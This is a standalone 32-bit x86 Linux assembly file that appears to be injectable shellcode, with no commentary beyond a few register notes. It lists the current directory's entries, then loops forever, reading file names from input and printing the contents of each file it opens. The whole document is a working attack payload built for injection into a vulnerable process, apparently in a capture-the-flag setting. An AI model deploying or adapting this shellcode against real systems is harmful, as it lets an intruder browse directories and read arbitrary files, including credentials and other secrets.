BITS 32
global _start
_start:
    jmp loadstring
dir_read:
    pop ebx
    xor eax,eax
    xor ecx,ecx
    xor edx,edx
    mov al,0x5
    int 0x80

    mov dl,0x7f
    mov ecx,esp ; old_linux_dirent
    mov ebx,eax ; fd
    mov al,0x59
opendir:
    pushad ; store fd
    int 0x80
    test eax,eax
    jz file_read

    movzx dx,[ecx+0x8]    ; d_namlen
    mov bl,0x1
    lea ecx,[ecx+ebx+0x9] ; d_name
    mov al,0x4
    int 0x80

    mov dl,0x1
    lea ecx,[edx+0x9]
    push ecx
    mov ecx,esp
    mov al,0x4
    int 0x80
    add esp,0x4

    popad
    jmp opendir
loadstring:
    call dir_read
    db ".", 0
file_read:
    xor eax,eax
    xor ebx,ebx
    mov ecx,esp
    xor edx,edx
    mov dl,0xff
    mov al,0x3
    int 0x80
    mov byte [esp+eax-1], 0x0

    xor eax,eax
    mov ebx,esp
    xor ecx,ecx
    xor edx,edx
    mov al,0x5
    int 0x80

    mov ebx,eax
    mov ecx,esp
    mov dl,0xff
    mov al,0x3
    int 0x80

    xchg eax,edx
    mov bl,0x1
    mov al,0x4
    int 0x80
    jmp file_read
